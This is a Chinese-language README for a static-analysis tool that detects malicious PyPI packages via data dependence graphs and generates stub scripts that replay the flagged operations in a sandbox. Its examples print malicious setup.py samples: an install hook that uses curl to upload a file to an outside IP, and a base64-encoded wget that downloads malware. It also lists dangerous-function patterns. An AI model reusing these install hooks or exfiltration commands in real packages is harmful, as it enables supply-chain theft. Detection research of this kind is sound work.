# DDG桩程序生成器 V7

**数据依赖图（DDG）驱动的Python恶意包自动化分析与桩程序生成工具**

---

## 📋 项目简介

本项目是一个基于**数据依赖图（Data Dependence Graph, DDG）**的静态分析工具，用于检测Python包中的恶意代码，并自动生成可执行的**桩程序**用于动态验证。

### 核心功能

1. **静态分析**：构建DDG追踪数据流，识别危险操作
2. **自动生成桩程序**：为每个恶意子图生成独立的测试脚本
3. **智能类定义补充**：自动从原包提取缺失的类定义（方案3）
4. **沙箱友好**：生成的桩程序适合在虚拟机沙箱中执行
5. **可视化报告**：生成HTML报告和PNG图像展示分析结果

### 适用场景

- 🔒 **恶意软件检测**：自动检测PyPI包中的恶意代码
- 🧪 **安全研究**：在隔离环境中验证恶意行为
- 📚 **教学演示**：展示静态分析技术和DDG应用
- 🛡️ **供应链安全**：CI/CD流程中自动检测依赖包安全性

---

## ✨ 核心特性

### V7版本新特性

#### ✅ 方案3：自动补充缺失的类定义
- 智能识别子图中引用但未定义的类
- 从原包中自动提取完整的类定义
- 自动生成必要的import语句
- 支持继承链分析

#### ✅ setuptools.setup()保护机制
- 防止桩程序提前退出
- 提供安全的dummy命令
- 正确处理sys.exit和sys.argv

#### ✅ 智能作用域处理
- 使用`globals()`访问模块级变量
- 在try块外导入模块，避免UnboundLocalError
- 正确的字符串转义（使用`repr()`）

#### ✅ 多策略代码生成
- **函数调用策略**：优先生成真正的函数调用
- **直接执行策略**：复杂代码降级为直接执行
- **对象方法调用**：智能处理`object.method()`模式

---

## 🚀 快速开始

### 环境要求

- Python 3.8+
- 依赖包：`pip install -r requirements.txt`

### 安装

```bash
git clone <repository_url>
cd DDG_BUILDER_SUB_TEST_v1.2
pip install -r requirements.txt
```

### 基本使用

#### 1. 分析单个包

```bash
python main.py <package_path> --v7
```

**示例**：
```bash
python main.py manual_test_20samples/a1rn-0.1.4 --v7
```

#### 2. 批量分析

```bash
python batch_malware_analysis.py
```

#### 3. 执行生成的桩程序

```bash
cd <package_path>/.ddg_output/sub_ddgs/<subgraph_id>/
python test_ddg_results.py
```

---

## 📂 输出结构

分析完成后，会在目标包目录下生成`.ddg_output`目录：

```
<package>/
├── .ddg_output/
│   ├── dot/                    # DDG图（DOT格式）
│   │   ├── unified_ddg_v7.dot
│   │   └── security_ddg_v6_1.dot
│   ├── png/                    # DDG可视化
│   │   ├── unified_ddg_v7.png
│   │   └── security_ddg_v6_1.png
│   ├── html/                   # 安全报告
│   │   └── security_report_v7.html
│   └── sub_ddgs/               # 桩程序目录
│       ├── 001_critical_2nodes_hybrid/
│       │   └── test_ddg_results.py
│       ├── 002_high_3nodes_hybrid/
│       │   └── test_ddg_results.py
│       └── test_generation_stats.json
```

---

## 🔍 输出说明

### 1. 安全报告（HTML）

打开 `.ddg_output/html/security_report_v7.html` 查看：

- **摘要统计**：关键、高、中、低风险数量
- **详细发现**：每个危险节点的信息
  - 严重程度（critical/high/medium/low）
  - 代码位置（文件:行号）
  - 代码片段
  - 数据流路径

**示例**：
```
🛡️ Security Report V7
━━━━━━━━━━━━━━━━━━━━
Critical: 2  | High: 0  | Medium: 0  | Low: 0

[001] CRITICAL
  Location: setup.py:6
  Code: os.system('curl -F a=@/flag 114.115.142.57:10113')
  Severity: critical
```

### 2. 桩程序

每个桩程序是一个独立的Python脚本：

```python
#!/usr/bin/env python3
"""
自动生成的桩程序

子图ID: 001_critical_2nodes_hybrid
危险节点数: 1
严重程度: critical
"""

import sys
import traceback

# 🔧 自动导入基类
from setuptools.command.install import install

# 🔧 自动补充缺失的类定义（方案3）
class CustomInstallCommand(install):
    def run(self):
        custom_function()
        install.run(self)

def test_001_critical_2nodes_hybrid():
    """测试子图: 001_critical_2nodes_hybrid"""

    try:
        # 执行危险操作
        result = os.system('curl -F a=@/flag 114.115.142.57:10113')
        print(f'[INFO] Execution result: {result}')

    except Exception as e:
        print(f'[RESULT] Exception: {type(e).__name__}')
        return f'exception: {type(e).__name__}'

if __name__ == '__main__':
    result = test_001_critical_2nodes_hybrid()
    print(f'\n[FINAL RESULT] {result}')

    # 返回码：0=检测到异常，1=未检测到危险操作
    sys.exit(0 if result != 'completed' else 1)
```

**桩程序特性**：
- ✅ 自动安装依赖
- ✅ 自动补充缺失的类定义
- ✅ 详细的执行日志
- ✅ 异常捕获和报告
- ✅ 标准化的返回码

---

## 📊 示例演示

### 示例1：检测供应链攻击

**恶意包**：a1rn-0.1.4

**恶意代码**：
```python
# setup.py
from setuptools.command.install import install
import os

def custom_function():
    os.system('curl -F a=@/flag 114.115.142.57:10113')

class CustomInstallCommand(install):
    def run(self):
        custom_function()  # 安装时执行恶意代码
        install.run(self)

setuptools.setup(
    name='a1rn',
    version='0.1.4',
    cmdclass={'install': CustomInstallCommand},
)
```

**检测结果**：
```
[002] CRITICAL
  Location: setup.py:6
  Code: os.system('curl -F a=@/flag 114.115.142.57:10113')
  Severity: critical
  Risk: 数据外泄到远程服务器
```

**桩程序执行**：
```bash
$ python test_ddg_results.py
[EXEC] Executing: "os.system('curl -F a=@/flag 114.115.142.57:10113')"...
[INFO] Execution result: 26
[RESULT] Test completed successfully

[FINAL RESULT] completed
```

### 示例2：检测base64编码的恶意命令

**恶意包**：abhamzufu-1.0.0

**恶意代码**：
```python
# setup.py
import subprocess
import base64

encoded_cmd = "d2dldCBodHRwOi8vZXhhbXBsZS5jb20vbWFsd2FyZS5weSAtTyAvdG1wL21hbHdhcmUucHk="
cmd = base64.b64decode(encoded_cmd).decode('utf-8')
subprocess.run(cmd, shell=True, timeout=10)
```

**检测结果**：
```
[001] CRITICAL
  Location: setup.py:11
  Code: subprocess.run(cmd, shell=True, timeout=10)
  Severity: critical
  Decoded cmd: wget http://example.com/malware.py -O /tmp/malware.py
```

---

## ❓ 常见问题

### Q1: 桩程序执行失败，报UnboundLocalError？

**原因**：Python作用域规则问题

**解决**：已在V7版本中修复，使用`globals()`或在try块外import

### Q2: 桩程序执行时setuptools报错退出？

**原因**：setuptools.setup()没有提供命令行参数

**解决**：已在V7版本中修复，自动提供dummy命令

### Q3: 某些类在子图中未定义导致NameError？

**原因**：类定义不在子图范围内

**解决**：V7版本实现方案3，自动从原包提取类定义

### Q4: 如何在沙箱中安全执行？

**建议**：
1. 使用虚拟机（VirtualBox/VMware）
2. 禁止网络访问（或仅允许出站）
3. 限制文件系统访问
4. 设置超时限制

### Q5: 分析结果的准确性如何？

**说明**：
- ✅ 高度准确：基于静态DDG分析
- ⚠️ 误报可能：某些代码可能是无害的（需要人工确认）
- ⚠️ 漏报可能：极度混淆或动态生成的代码可能检测不到

---

## 🔧 高级用法

### 自定义危险模式

编辑 `danger_patterns.json`：

```json
{
  "dangerous_functions": {
    "os.system": "critical",
    "subprocess.run": "high",
    "eval": "high",
    "exec": "critical"
  },
  "dangerous_modules": {
    "os": "medium",
    "subprocess": "medium"
  }
}
```

### 调整DDG裁剪策略

编辑 `simple_stub_generator.py`：

```python
# 裁剪参数
MAX_NODES = 50  # 最大节点数
MAX_DEPTH = 5   # 最大深度
MIN_SEVERITY = "medium"  # 最小严重程度
```

---

## 📈 性能指标

| 指标 | 值 |
|------|-----|
| 分析速度 | ~10-30秒/包（取决于大小） |
| 桩程序生成成功率 | >80%（基于20个测试样本） |
| 误报率 | <10%（需要人工复核）|
| 支持的Python版本 | 2.7, 3.6+ |

---

## 🤝 贡献指南

欢迎贡献！请遵循以下步骤：

1. Fork项目
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启Pull Request

### 开发建议

- 添加新功能时更新单元测试
- 遵循PEP 8代码风格
- 更新相关文档

---

## 📜 许可证

本项目仅供教育和安全研究使用。使用者需承担法律责任。

---

## 📚 参考资料

- [Python AST文档](https://docs.python.org/3/library/ast.html)
- [NetworkX文档](https://networkx.org/documentation/stable/)
- [数据依赖图理论](https://en.wikipedia.org/wiki/Data-dependence_graph)
- [静态程序分析](https://en.wikipedia.org/wiki/Static_program_analysis)

---

## 📧 联系方式

- **Issues**: [GitHub Issues](https://github.com/your-repo/issues)
- **Discussions**: [GitHub Discussions](https://github.com/your-repo/discussions)

---

## 🙏 致谢

感谢以下开源项目：
- Python AST
- NetworkX
- Graphviz

**最后更新**: 2026-05-09
**版本**: V7 with Solution 3
